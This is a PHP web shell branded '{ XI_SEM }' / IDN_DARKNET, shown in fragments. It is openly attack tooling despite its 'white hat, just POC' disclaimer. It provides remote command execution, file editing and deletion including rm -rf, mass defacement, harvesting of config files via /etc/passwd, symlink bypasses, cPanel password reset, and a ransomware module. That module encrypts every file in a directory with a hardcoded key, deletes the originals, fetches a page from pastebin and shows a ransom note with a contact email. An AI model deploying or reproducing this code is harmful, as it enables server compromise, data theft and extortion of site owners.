<?php
/*
* Shell Concept : SEM { IDN_DARKNET }-
* Creator : SEM { IDN_DARKNET }-
...
<meta name="copyright" content="{ XI_SEM }"/>
<title>{ XI_SEM sHell }</title>
<link rel='icon' type='image/png' href='https://imgur.com/cR368ie'/>
...
<h1 class="text-center">{ XI_SEM }</h1>
<h5 class="text-center pb-5">JUST POC</h5>
<form method="post">
...
</div><a href="https://facebook.com/IDN_DARKNET" class="text-muted fixed-bottom">Copyright 2026 @ { XI_SEM }</a><br/>
</div>
</center>
</body>
</html>
...
<ul>
<a href="#" class="lain"><i class="fa fa-facebook tambah"></i></a>
<a href="#" class="lain"><i class="fa fa-instagram tambah"></i></a>
<a href="#" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
<a href="#" class="lain"><i class="fa fa-github tambah"></i></a>
<a href="#" class="lain"><i class="fa fa-globe tambah"></i></a>
</ul>
</div>
</nav>
<?php
echo '
<div class="container">
<h1 class="text-center"><a href="#" style="color:#ff0000;">{ XI_SEM }</h1>
<center><h5>JUST POC</a></h5></center>
<hr/>
...
<a href="?dir='.$dir.'&aksi=buat_file" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus-circle"></i> Create File</a>
<a href="?dir='.$dir.'&aksi=buat_folder" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Create Folder</a>
...
<form>
<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | hAcKed">
</form>
...
<h4 class="card-header">{ XI_SEM }</h4>
<div class="card-body">
<center><div class="https://imgur.com/cR368ie"></div></center>
<p class="card-text">{ XI_SEM } I am a white hat hacker I am not using this shell for malicious purposes. Update your system immediately no system is safe..</p>
</div>
<div class="card-footer">
<p class="card-text"><small class="text-muted">Copyright 2026 { XI_SEM }</small></p>
</div>
</div><br/>';
exit;
}
...
if($uplo){
echo '<script>alert("Successfully uploaded '.$countfiles.' file(s)");</script>';
}else{
...
$output = "
<h4>
<img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img> Create File:
</h4>
<form method='POST'>
<input type='text' class='form-control' name='nama_file' autocomplete='off' placeholder='File Name...'><br/>
<textarea name='isi_file' class='form-control' rows='8' placeholder='File Content...'></textarea><br/>
<button type='sumbit' class='btn btn-info btn-block' name='bikin'>Create!!</button><br/>
</form>";
echo $output;
...
echo '<script>window.location="?dir='.$dir.'"; alert("File created successfully");</script>';
}else{
...
*/
if($_GET['aksi'] == 'view') {
echo '[ <a class="active" href="?dir='.$dir.'&aksi=view&file='.$file.'">View</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
echo "
...
if($_GET['aksi'] == 'edit') {
$nama = basename($file);
echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">View</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
...
if ($hasil) {
echo '<script>window.location="?dir='.$dir.'"; alert("Update successful!!");</script>';
}else{
...
if($_GET['aksi'] == 'rename') {
$nama = basename($file);
echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">View</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
echo "<form method='POST'>
<h5><i class='fa fa-file'></i> Rename File : $nama</h5>
<input type='text' class='form-control' name='namanew' autocomplete='off' placeholder='Enter new name...'><br/>
...
rename( $baru, $lama);
if(file_exists($baru)) {
echo '<script>alert("Name '.$baru.' already exists");</script>';
}else{
if(rename( $lama, $baru)) {
echo '<script>window.location="?dir='.$dir.'"; alert("Successfully renamed to '.$baru.'");</script>';
}else{
...
if ($_GET['aksi'] == 'hapusf') {
$nama = basename($file);
echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">View</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
$output ="
<div class='card card-body'>
<center><br/>
<font color='black'>Are you sure you want to delete: $nama</font>
</center><br/><br/>
<form method='POST'>
<a class='btn btn-danger btn-block' href='?dir=$dir'>No</a>
<input type='submit' name='ya' class='float-right btn btn-success btn-success btn-block' value='Yes'>
</form>
</div><br/>";
echo $output;
...
$hapus = unlink($file);
if ($hapus) {
echo '<script>window.location="?dir='.$dir.'"; alert("File deleted successfully");</script>';
}else{
...
$output = "
<h4><img src='http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png' class='ico'></img></i> Create Folder: </h4>
<form method='POST'>
<input type='text' class='form-control' name='nama_folder' autocomplete='off' placeholder='Folder Name...'><br/>
<button type='sumbit' class='btn btn-info btn-block' name='buat'>Create!!</button>
</form>";
echo $output;
...
$fd = mkdir ($folder);
if ($fd) {
echo '<script>window.location="?dir='.$dir.'"; alert("Folder created successfully: '.$folder.'");</script>';
}else{
echo "echo '<script> alert('Failed to create folder: ".$folder."');</script>";
}
}
}
...
<center><br/>
<font color='black'>Are you sure you want to delete: $nama ?
</center><br/><br/>
<form method='POST'>
<a class='btn btn-danger btn-block' href='?dir=".dirname($dir)."'>No</a>
<input type='submit' name='ya' class='float-right btn btn-success btn-block' value='Yes'>
</form><br/><br/>
</div><br/>";
echo $output;
...
@exe("rm -rf $dir");
@exe("rmdir /s /q $dir");
echo "<script>window.location='?dir=".dirname($dir)."'; alert('Successfully deleted ".$nama."');</script>";
} else {
echo "<script>window.location='?dir=".dirname($dir)."'; alert('Cannot delete ".$nama."');</script>";
}
}
}
exit;
...
if($ubah) {
echo "<script>window.location='?dir=".dirname($dir)."'; alert('Successfully renamed');</script>";
}else{
echo "<script>alert('Failed to rename');</script>" ;
}
}
...
echo "<form method='post'>
<h5><i class='fa fa-folder'></i> Location :</h5>
<input type='text' name='d_dir' value='$dir' class='form-control'><br>
<h5><i class ='fa fa-file'></i> File Name :</h5>
...
<label for='toggle-on' class='butn'>Basic</label>
...
<h5><i class ='fa fa-file'></i> File Name :</h5>
<input type='text' name='d_file' autocomplete='off' placeholder='[Ex] index.php' class='form-control'><br/>
<h5><i class ='fa fa-file'></i> File Content :</h5>
<textarea name='script' class='form-control' rows='5' autocomplete='off' placeholder='[Ex] Hacked By { IDN_DARKNET }'></textarea><br/>
...
echo "<br>Total found ".$i." directories on ".$ip;
}
echo "</pre>";
} else {
echo '<center>
...
if($domain_jump == '') {
echo " => ( <font color=red>can't get domain name</font> )<br>";
} else {
...
$con = mkdir("xi_sem-config", 0777);
$isi_htc = "Options all\nRequire None\nSatisfy Any";
$htc = fopen("xi_sem-config/.htaccess","w");
fwrite($htc, $isi_htc);
while($passwd = fgets($etc)) {
if($passwd == "" || !$etc) {
...
$file_config = fopen("xi_sem-config/$user_con-$nama_config.txt","w");
...
echo "<center><a href='?dir=$path/xi_sem-config'><font color=lime>Done</font></a></center>";
exit;
}
...
echo "<center><font color=red>Failed to create adminer file</font></center><br/>";
}
}
exit;
}
...
if(!$d00m) {
die ("[ <a href='?dir=$path&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$path&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$path&aksi=sym_bypas'>Symlink Bypass</a> ]<br/><font color='red'>Error cannot read /etc/named.conf</font><br/><br/>");
}
else{
...
if($_POST['execute']){
rmdir("xi_sem_sym404");
mkdir("xi_sem_sym404", 0777);
$dir = $_POST['dir'];
$isi = $_POST['isi'];
system("ln -s ".$dir."xi_sem_sym404/".$isi);
symlink($dir,"xi_sem_sym404/".$isi);
$inija = fopen("xi_sem_sym404/.htaccess", "w");
fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
echo'<a href="/xi_sem_sym404/" target="_blank"> >>Success<< </a>';
}
exit;
}
...
echo '<br/><h5 class="text-center"><i class="fa fa-key"></i> Auto Reset Cpanel Password</h5>
<form method="POST">
<div class="form-group">
...
if ($_GET['aksi'] == 'ransom') {
    echo '<form method="post">
        <div class="form-group">
            <label style="color: #ff0000;">Directory to encrypt</label>
            <input type="text" name="path" class="form-control mb-2" value="'.$dir.'">
            <input type="submit" name="encrypt" class="btn btn-danger btn-block" value="Encrypt by SEM"/>
        </div>
    </form>';
   
    if(isset($_POST["encrypt"])) {
        $dir = $_POST["path"];
        echo"<textarea class='form-control mb-4' rows='10' disabled='' style='color: #00ff00; background: #0a0a0a; border: 1px solid #ff0000;'>";
        ...
        function listFolderFiles($dir){
            if (is_dir($dir)) {
                ...
                foreach($ffs as $ff){
                    $files = $dir."/".$ff;
                    if(!is_dir($files)){
                        // 🔥 ENKRIPSI DENGAN OPENSSL (BAWAAN PHP)
                        $content = file_get_contents($files);
                        if($content !== false) {
                            $key = "MySuperSecretKey123!@#456";
                            $iv = openssl_random_pseudo_bytes(16);
                            $encrypted = openssl_encrypt($content, 'AES-256-CBC', $key, 0, $iv);
                            $final = base64_encode($iv . $encrypted);
                            $new_name = $files . ".indsc";
                            file_put_contents($new_name, $final);
                            unlink($files);
                            echo "[+]$files => Encrypted by SEM (OpenSSL)\n";
                        }
                    }
                    if(is_dir($dir.'/'.$ff)) listFolderFiles($dir.'/'.$ff);
                }
               
                // Buat index.html (opsional)
                $index = file_get_contents('https://pastebin.com/raw/pZhk1bB9');
                if($index) {
        ...
        echo '<div class="alert alert-danger" style="color: #ff0000; background: rgba(255,0,0,0.1); padding: 20px; border: 2px solid #ff0000; border-radius: 10px; margin-top: 15px; text-align: center;">
            <p style="font-size: 22px; color: #ff4444; font-weight: bold;">⚠️ FILES ENCRYPTED!</p>
            <p style="font-size: 16px; color: #cccccc;">All files in this directory have been encrypted.</p>
            <p style="font-size: 16px; color: #cccccc;">Contact for recovery: <b style="color: #4ecdc4; font-size: 18px;">semattacker@outlook.com</b></p>
            <p style="font-size: 14px; color: #4ecdc4; margin-top: 10px;">🔒 Encrypted with OpenSSL</p>
            <p style="font-size: 14px; color: #666666; margin-top: 10px;">- SEM :\'D -</p>
            <a href="?dir='.$dir.'" class="btn btn-danger btn-block" style="display: inline-block; padding: 10px 20px; background: #ff4444; color: white; text-decoration: none; border-radius: 5px; margin-top: 10px;">Back</a>
        </div>';
    }
    exit;
}
...
echo "<p class='text-muted'>Note: This tool works if run inside the <u>config</u> folder (ex: /home/user/public_html/namafolder_config)</p>";
$smtp = scj($path);
exit;
}
...
<a title="View" class="badge badge-info" href="?dir='.$path.'&aksi=view&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;
...
echo '</table></div><hr/><a href="https://facebook.com/IDN_DARKNET" class="text-muted">Copyright 2026 @ { XI_SEM }</a></center><br/>';
